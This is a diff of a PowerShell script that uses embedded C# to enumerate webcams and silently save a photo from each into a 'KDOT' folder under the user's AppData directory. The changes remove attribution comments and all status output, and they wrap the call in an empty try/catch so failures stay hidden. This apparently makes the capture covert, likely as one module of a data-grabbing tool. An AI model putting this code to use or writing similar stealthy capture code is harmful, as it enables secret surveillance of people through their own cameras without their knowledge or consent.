@@ -1,8 +1,5 @@
 function Get-WebCamImage {
     # made by https://github.com/stefanstranger/PowerShell/blob/master/Get-WebCamp.ps1
-    # he did 99% of the work
-    # other 1% modified by KDot227
-    # had to half learn c# to figure anything out (I still don't understand it)
     $source=@" 
     using System; 
     using System.Collections.Generic; 
@@ -137,26 +134,20 @@ function Get-WebCamImage {
         } 
     } 
 "@ 
-
     Add-Type -AssemblyName System.Drawing  
     $jpegCodec = [Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() |   
-    Where-Object { $_.FormatDescription -eq "JPEG" }  
+    Where-Object { $_.FormatDescription -eq "JPEG" }       
     Add-Type -TypeDefinition $source -ReferencedAssemblies System.Windows.Forms, System.Data, System.Drawing  | Out-Null
-
-
     try {
-        #region Import the Assemblies 
         [reflection.assembly]::loadwithpartialname("System.Windows.Forms") | Out-Null 
         [reflection.assembly]::loadwithpartialname("System.Drawing") | Out-Null 
-        #endregion 
         $picCapture = New-Object System.Windows.Forms.PictureBox 
-        
         try {
-            Write-Host "Getting camera"
             $devices = [WebCamLib.DeviceManager]::GetAllDevices()
         } catch {
-            Write-Host "No camera found"
-        }
+			Write-Host "No camera found"
+			
+		}
         $count = 0
         foreach ($device in $devices) {
             $imagePath = "$env:APPDATA\KDOT\out$count.jpg"
@@ -168,11 +159,10 @@ function Get-WebCamImage {
             $count++
             [Windows.Forms.Clipboard]::Clear()
         }
-        Write-Host $count
 
     } catch {
-            Write-Host "No camera found"
-        }
+		Write-Host "No camera found"
+		
+	}
 }
-
-Get-WebCamImage
+try {Get-WebCamImage} catch {}
